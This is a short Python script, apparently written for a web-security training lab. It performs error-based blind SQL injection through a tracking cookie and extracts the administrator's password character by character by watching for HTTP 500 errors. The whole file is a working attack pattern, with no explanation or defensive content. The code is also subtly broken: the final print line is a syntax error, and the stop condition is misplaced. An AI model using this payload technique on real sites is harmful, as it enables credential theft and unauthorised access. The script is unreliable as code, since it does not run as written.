import requests
import string

url='https://acaa1fa41e0d3e4cc05d039200b7009c.web-security-academy.net/'
chars = string.printable[:-6]
#print(chars)
admin_pass=''
i=1
s=requests.Session()
s.get(url)

while True:
	for c in chars:
		payload = f"1' union select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,{i},1)='{c}'-- -"
		cookie1={"TrackingId":payload}
		r = requests.get(url,cookies=cookie1)
		print(c)
		if r.status_code == 500:
			print('okeeeeeeeeeee')
			admin_pass+=c 
			i+=1
			print(admin_pass)
			break
		if(i==21):
			print('password administrator :' admin_pass)
			exit()

